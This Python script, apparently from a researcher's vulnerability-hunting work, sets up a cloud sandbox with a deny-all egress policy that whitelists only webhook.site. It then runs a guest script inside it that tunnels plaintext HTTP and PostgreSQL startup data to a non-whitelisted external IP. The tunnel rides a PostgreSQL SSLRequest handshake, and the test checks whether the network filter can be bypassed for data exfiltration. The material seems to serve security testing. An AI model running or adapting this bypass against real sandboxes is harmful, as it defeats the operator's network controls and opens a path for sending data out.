# -*- coding: utf-8 -*-
"""Phase13: PG 链明文数据判别 - 非白名单 IP 数据面是否击穿"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

SID = fresh_sandbox_deny_all("fwtest6")

GUEST = r'''
import socket, struct, time

def pg_send(ip, port, data, label='', wait=8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(wait)
        s.connect((ip, port))
        s.sendall(struct.pack('>II', 8, 80877103))
        r = s.recv(1)
        print('[%s %s:%d] SSLRequest->%r' % (label, ip, port, r), flush=True)
        if r != b'S':
            s.close()
            return
        s.sendall(data)
        try:
            resp = s.recv(500)
            print('[%s %s:%d] resp: %r' % (label, ip, port, resp[:150]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT after send' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

# PG startup message: len + 196608 (3.0) + params
def pg_startup():
    body = b'\x00\x03\x00\x00' + b'user\x00x\x00database\x00x\x00\x00'
    return struct.pack('>I', len(body) + 4) + body

HTTP = b'GET /anything HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n'

# 1) 关键: PG链 -> 非白名单IP httpbin:80 + 明文HTTP (httpbin会响应 => 数据外传)
pg_send('34.195.135.204', 80, HTTP, 'PG->np80+HTTP')
# 2) PG链 -> 非白名单IP httpbin:80 + PG startup明文
pg_send('34.195.135.204', 80, pg_startup(), 'PG->np80+PGstartup')
# 3) PG链 -> 非白名单IP httpbin:443 + 明文HTTP (443收明文 => 400/RST, 但看代理转发行为)
pg_send('34.195.135.204', 443, HTTP, 'PG->np443+HTTP')
# 4) 对照: 无SSLRequest 明文HTTP到非白名单IP:80 (期望RST)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    s.connect(('34.195.135.204', 80))
    s.sendall(HTTP)
    try:
        r = s.recv(300)
        print('[plain np80+HTTP] resp: %r' % r[:120], flush=True)
    except socket.timeout:
        print('[plain np80+HTTP] TIMEOUT', flush=True)
    s.close()
except Exception as e:
    print('[plain np80+HTTP] EXC %s: %s' % (type(e).__name__, e), flush=True)
print('done', flush=True)
'''

code = "cat > /tmp/pg21.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg21.py"

if __name__ == "__main__":
    # custom 白名单 webhook.site
    body = {"mode": "custom", "allowedDomains": ["webhook.site"]}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM), body)
    print('set custom:', c, flush=True)
    time.sleep(2)
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:4500], flush=True)
